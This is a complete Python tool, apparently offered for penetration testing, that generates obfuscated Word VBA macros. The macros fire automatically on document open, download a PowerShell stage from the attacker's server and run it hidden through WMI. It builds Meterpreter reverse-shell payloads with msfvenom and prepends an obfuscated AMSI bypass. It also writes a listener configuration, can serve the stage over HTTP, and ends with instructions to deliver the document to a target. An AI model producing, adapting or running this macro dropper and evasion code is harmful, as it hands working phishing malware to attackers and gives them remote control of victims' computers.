#!/usr/bin/env python3
"""
MacroForge - Obfuscated VBA Macro Payload Generator
For authorized penetration testing only.

Usage:
  python MacroForge.py --lhost 10.10.16.7
  python MacroForge.py --lhost 10.10.16.7 --lport 4444 --arch x64 --payload reverse_https
  python MacroForge.py --lhost 10.10.16.7 --serve   (auto-start HTTP server + handler)
"""

import argparse
import os
import re
import subprocess
import sys
import random
import string
import threading
import http.server
import socketserver
import time

BANNER = r"""
  __  __                     _____                    
 |  \/  | __ _  ___ _ __ __|  ___|__  _ __ __ _  ___ 
 | |\/| |/ _` |/ __| '__/ _ \ |_ / _ \| '__/ _` |/ _ \
 | |  | | (_| | (__| | | (_) |  _| (_) | | | (_| |  __/
 |_|  |_|\__,_|\___|_|  \___/|_|  \___/|_|  \__, |\___|
                                             |___/      
         Obfuscated VBA Macro Generator v1.0
"""

# ─────────────────── Payload Mapping ───────────────────

PAYLOADS = {
    "reverse_tcp": {
        "x86": "windows/meterpreter/reverse_tcp",
        "x64": "windows/x64/meterpreter/reverse_tcp",
    },
    "reverse_https": {
        "x86": "windows/meterpreter/reverse_https",
        "x64": "windows/x64/meterpreter/reverse_https",
    },
    "reverse_http": {
        "x86": "windows/meterpreter/reverse_http",
        "x64": "windows/x64/meterpreter/reverse_http",
    },
    "shell_tcp": {
        "x86": "windows/shell_reverse_tcp",
        "x64": "windows/x64/shell_reverse_tcp",
    },
}

# ─────────────────── Caesar Cipher ───────────────────

def caesar_encode(text, shift=1):
    """Encode string: shift each printable char (ASCII 34-126) by +shift."""
    result = []
    for ch in text:
        code = ord(ch)
        if 33 < code < 127:
            new_code = code + shift
            if new_code >= 127:
                new_code = 34 + (new_code - 127)
            result.append(chr(new_code))
        else:
            result.append(ch)
    return "".join(result)


def caesar_verify(encoded, shift, expected):
    """Verify decode(encoded) == expected."""
    decoded = []
    for ch in encoded:
        code = ord(ch)
        if 33 < code < 127:
            decoded.append(chr(code - shift))
        else:
            decoded.append(ch)
    result = "".join(decoded)
    assert result == expected, f"Verify failed: decode({encoded!r}) = {result!r}, expected {expected!r}"


# ─────────────────── VBA Generation ───────────────────

def random_name(length=6):
    """Random variable name."""
    return random.choice(string.ascii_lowercase) + "".join(
        random.choices(string.ascii_lowercase + string.digits, k=length - 1)
    )


def generate_vba(lhost, http_port, shift, stage_filename):
    """Generate obfuscated VBA macro."""

    url = f"http://{lhost}:{http_port}/{stage_filename}"
    temp_name = random_name(8) + ".ps1"

    enc = lambda s: caesar_encode(s, shift)

    # Encode all sensitive strings
    e_xmlhttp = enc("Msxml2.XmlHttp")
    e_get     = enc("GET")
    e_url     = enc(url)
    e_temp    = enc("TEMP")
    e_fname   = enc(temp_name)
    e_fso     = enc("Scripting.FileSystemObject")
    e_psh     = enc("powershell")
    e_wmi_pre = enc("winmgmts:Win32")
    e_wmi_suf = enc("Process")

    # Verify all encodings
    for encoded, original in [
        (e_xmlhttp, "Msxml2.XmlHttp"),
        (e_get, "GET"),
        (e_url, url),
        (e_temp, "TEMP"),
        (e_fname, temp_name),
        (e_fso, "Scripting.FileSystemObject"),
        (e_psh, "powershell"),
        (e_wmi_pre, "winmgmts:Win32"),
        (e_wmi_suf, "Process"),
    ]:
        caesar_verify(encoded, shift, original)

    # Random VBA sub/function names
    fn_main   = random_name(5)
    fn_decode = random_name(4)

    vba = f"""Sub AutoOpen()
    {fn_main}
End Sub

Sub Document_Open()
    {fn_main}
End Sub

Private Sub {fn_main}()
    On Error Resume Next

    Dim h As Object
    Set h = CreateObject({fn_decode}("{e_xmlhttp}"))
    h.Open {fn_decode}("{e_get}"), {fn_decode}("{e_url}"), False
    h.send

    Dim fp As String
    fp = Environ({fn_decode}("{e_temp}")) & Chr(92) & {fn_decode}("{e_fname}")

    Dim fs As Object
    Set fs = CreateObject({fn_decode}("{e_fso}"))
    Dim fw As Object
    Set fw = fs.CreateTextFile(fp, True)
    fw.Write h.responseText
    fw.Close

    Dim cmd As String
    cmd = {fn_decode}("{e_psh}") & " -nop -w 1 -ep bypass -f " & Chr(34) & fp & Chr(34)

    Dim wmi As Object
    Set wmi = GetObject({fn_decode}("{e_wmi_pre}") & Chr(95) & {fn_decode}("{e_wmi_suf}"))
    Dim r As Long
    wmi.Create cmd, Null, Null, r
End Sub

Private Function {fn_decode}(s As String) As String
    Dim i As Long, a As Long
    For i = 1 To Len(s)
        a = Asc(Mid(s, i, 1))
        If a > 33 And a < 127 Then
            {fn_decode} = {fn_decode} & Chr(a - {shift})
        Else
            {fn_decode} = {fn_decode} & Mid(s, i, 1)
        End If
    Next i
End Function"""
    return vba


# ─────────────────── PS1 Generation ───────────────────

AMSI_BYPASS = """\
$a='Sy'+'stem.Ma'+'nage'+'ment.Au'+'toma'+'tion.Am'+'si'+'Ut'+'ils'
$b='am'+'si'+'Init'+'Fa'+'iled'
try{[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)}catch{}

"""


IS_WINDOWS = sys.platform.startswith("win")


def _bin_candidates(msf_path, name):
    """Return candidate paths for a Metasploit binary."""
    names = [name + ".bat", name] if IS_WINDOWS else [name]
    paths = []
    for n in names:
        paths.append(os.path.join(msf_path, "bin", n))
        paths.append(os.path.join(msf_path, n))
    # Kali / Linux global paths
    if not IS_WINDOWS:
        paths.append(os.path.join("/usr", "bin", name))
        paths.append(os.path.join("/usr", "share", "metasploit-framework", name))
    return paths


def find_msfvenom(msf_path):
    """Locate msfvenom binary."""
    for c in _bin_candidates(msf_path, "msfvenom"):
        if os.path.exists(c):
            return c
    return None


def find_msfconsole(msf_path):
    """Locate msfconsole binary."""
    for c in _bin_candidates(msf_path, "msfconsole"):
        if os.path.exists(c):
            return c
    return None


def generate_ps1(msf_path, payload_full, lhost, lport, output_path):
    """Generate PS1 payload with AMSI bypass via msfvenom."""

    msfvenom = find_msfvenom(msf_path)
    if not msfvenom:
        print(f"[-] ERROR: msfvenom not found in {msf_path}")
        print("    Use --msf-path to specify Metasploit location.")
        sys.exit(1)

    print(f"[*] Running msfvenom: {payload_full}")

    tmp_path = output_path + ".tmp"
    cmd = [msfvenom, "-p", payload_full, f"LHOST={lhost}", f"LPORT={lport}", "-f", "psh", "-o", tmp_path]

    result = subprocess.run(cmd, capture_output=True, text=True)
    if not os.path.exists(tmp_path):
        print(f"[-] msfvenom failed to create payload.")
        print(f"    stdout: {result.stdout}")
        print(f"    stderr: {result.stderr}")
        sys.exit(1)

    with open(tmp_path, "r") as f:
        content = f.read()
    os.remove(tmp_path)

    # Add Start-Sleep after CreateThread to keep process alive
    content = re.sub(
        r"(\$\w+)::CreateThread\(0,0,(\$\w+),0,0,0\)",
        r"$hThread = \1::CreateThread(0,0,\2,0,0,0)\nStart-Sleep -Seconds 86400",
        content,
    )

    with open(output_path, "w") as f:
        f.write(AMSI_BYPASS + content)

    print(f"[+] PS1 payload saved: {output_path}")


# ─────────────────── Handler RC ───────────────────

def generate_handler_rc(payload_full, lhost, lport, output_path):
    """Generate msfconsole resource file."""
    rc = f"""use exploit/multi/handler
set payload {payload_full}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
    with open(output_path, "w") as f:
        f.write(rc)
    print(f"[+] Handler RC saved: {output_path}")


# ─────────────────── HTTP Server ───────────────────

def start_http_server(directory, port):
    """Start a simple HTTP server in a thread."""
    os.chdir(directory)
    handler = http.server.SimpleHTTPRequestHandler

    class QuietHandler(handler):
        def log_message(self, format, *args):
            print(f"    [HTTP] {args[0]}")

    with socketserver.TCPServer(("0.0.0.0", port), QuietHandler) as httpd:
        print(f"[*] HTTP server listening on 0.0.0.0:{port}")
        httpd.serve_forever()


# ─────────────────── Main ───────────────────

def detect_msf_path():
    """Try to auto-detect Metasploit path."""
    if IS_WINDOWS:
        common_paths = [
            r"E:\metasploit-framework",
            r"D:\metasploit-framework",
            r"C:\metasploit-framework",
            r"C:\Program Files\metasploit-framework",
            r"C:\Program Files (x86)\metasploit-framework",
        ]
    else:
        common_paths = [
            "/usr/share/metasploit-framework",
            "/opt/metasploit-framework",
            os.path.expanduser("~/metasploit-framework"),
            "/usr",  # Kali: msfvenom lives at /usr/bin/msfvenom
        ]
    for p in common_paths:
        if os.path.isdir(p) and find_msfvenom(p):
            return p
    return None


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="MacroForge - Obfuscated VBA Macro Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python MacroForge.py --lhost 10.10.16.7
  python MacroForge.py --lhost 10.10.16.7 --lport 443 --payload reverse_https
  python MacroForge.py --lhost 10.10.16.7 --serve
  python MacroForge.py --lhost 10.10.16.7 --arch x86 --shift 3
""",
    )
    parser.add_argument("--lhost", required=True, help="Your listener IP address")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (default: 4444)")
    parser.add_argument("--http-port", type=int, default=8080, help="HTTP staging port (default: 8080)")
    parser.add_argument("--arch", choices=["x86", "x64"], default="x64", help="Target arch (default: x64)")
    parser.add_argument(
        "--payload",
        choices=list(PAYLOADS.keys()),
        default="reverse_tcp",
        help="Payload type (default: reverse_tcp)",
    )
    parser.add_argument("--msf-path", default=None, help="Path to Metasploit Framework (auto-detect)")
    parser.add_argument("--output-dir", default=".", help="Output directory (default: current)")
    parser.add_argument("--shift", type=int, default=None, help="Caesar cipher shift 1-5 (default: random)")
    parser.add_argument("--serve", nargs="?", const=True, default=False, metavar="PORT", help="Auto-start HTTP server (optional port, e.g. --serve 8081)")
    parser.add_argument("--listen", action="store_true", help="Auto-start msfconsole handler after generation")

    args = parser.parse_args()

    # ── Handle --serve with optional port ──
    if args.serve is not False:
        if args.serve is not True:
            try:
                args.http_port = int(args.serve)
            except ValueError:
                print(f"[-] ERROR: Invalid port for --serve: {args.serve}")
                sys.exit(1)
        args.serve = True

    # ── Resolve paths ──
    if args.msf_path is None:
        args.msf_path = detect_msf_path()
        if args.msf_path:
            print(f"[*] Auto-detected Metasploit: {args.msf_path}")
        else:
            print("[-] ERROR: Cannot find Metasploit. Use --msf-path.")
            sys.exit(1)

    if args.shift is None:
        args.shift = random.randint(1, 5)

    payload_full = PAYLOADS[args.payload][args.arch]
    output_dir = os.path.abspath(args.output_dir)
    os.makedirs(output_dir, exist_ok=True)

    stage_filename = "rev.ps1"
    vba_path = os.path.join(output_dir, "macro.vba")
    ps1_path = os.path.join(output_dir, stage_filename)
    rc_path  = os.path.join(output_dir, "handler.rc")

    print(f"[*] Config: {args.lhost}:{args.lport} | {payload_full} | shift={args.shift}")
    print("=" * 60)

    # ── Step 1: Generate VBA ──
    print("\n[*] Step 1: Generating obfuscated VBA macro...")
    vba_code = generate_vba(args.lhost, args.http_port, args.shift, stage_filename)
    with open(vba_path, "w") as f:
        f.write(vba_code)
    print(f"[+] VBA macro saved: {vba_path}")

    # ── Step 2: Generate PS1 payload ──
    print("\n[*] Step 2: Generating PowerShell payload...")
    generate_ps1(args.msf_path, payload_full, args.lhost, args.lport, ps1_path)

    # ── Step 3: Generate handler RC ──
    print("\n[*] Step 3: Generating handler resource file...")
    generate_handler_rc(payload_full, args.lhost, args.lport, rc_path)

    # ── Summary ──
    msfconsole = find_msfconsole(args.msf_path) or "msfconsole"
    print(f"""
{'=' * 60}
[+] ALL FILES GENERATED SUCCESSFULLY
{'=' * 60}

  macro.vba   -> Paste into Word VBA Module
  rev.ps1     -> Hosted on HTTP server (auto-downloaded by macro)
  handler.rc  -> Metasploit handler config

=== Usage ===

  1) Start HTTP server:
     cd {output_dir}
     python -m http.server {args.http_port}

  2) Start Metasploit handler:
     {msfconsole} -r "{rc_path}"

  3) Create Word document:
     - New Word doc -> Alt+F11 -> Insert Module
     - Paste macro.vba contents
     - Save as .doc or .docm

  4) Deliver document to target

{'=' * 60}
  LHOST:    {args.lhost}
  LPORT:    {args.lport}
  HTTP:     :{args.http_port}
  ARCH:     {args.arch}
  PAYLOAD:  {payload_full}
  SHIFT:    {args.shift}
{'=' * 60}
""")

    # ── Auto-serve ──
    if args.serve:
        print("[*] Starting HTTP server...")
        t = threading.Thread(target=start_http_server, args=(output_dir, args.http_port), daemon=True)
        t.start()

        if args.listen:
            print("[*] Starting msfconsole handler...")
            if IS_WINDOWS:
                subprocess.Popen([msfconsole, "-r", rc_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
            else:
                subprocess.Popen([msfconsole, "-r", rc_path])

        print("[*] Press Ctrl+C to stop.\n")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")


if __name__ == "__main__":
    main()
